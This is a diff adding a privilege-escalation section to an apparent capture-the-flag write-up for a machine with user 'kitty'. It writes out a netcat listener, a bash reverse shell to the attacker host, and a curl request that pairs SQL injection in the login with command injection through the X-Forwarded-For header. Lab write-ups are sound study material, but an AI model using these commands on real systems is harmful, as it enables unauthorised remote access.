@@ -294,5 +294,48 @@ Password: L0ng_Liv3_KittY
 
 <figure><img src="../../.gitbook/assets/image (973).png" alt=""><figcaption></figcaption></figure>
 
+## Privlege Escalation <a href="#adc0" id="adc0"></a>
+
+We already know the username “kitty,” so let’s go straight to the password.
+
+**Kali**
+
+```
+nc -nvlp
+```
+
+**Victim**
+
+```
+echo 'sh -i >& /dev/tcp/$KALI/1337 0>&1' > /tmp/revshell.sh
+chmod +x /tmp/revshell.sh
+```
+
+### **Option #1**
+
+**Kali**
+
+```
+curl 'http://127.0.0.1:8081/index.php' -d "username=hacker' OR '1'='1-- -&password=epic" -H 'X-Forwarded-For: $(bash /tmp/revshell.sh)'
+```
+
+<figure><img src="../../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>
+
+### **Option #2**
+
+<figure><img src="../../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>
+
+**X-Forwarded-For**
+
+Add the following line to the payload
+
+```
+X-Forwarded-For: $(bash /tmp/revshell.sh)
+```
+
+<figure><img src="../../.gitbook/assets/image (977).png" alt=""><figcaption></figcaption></figure>
+
 
 
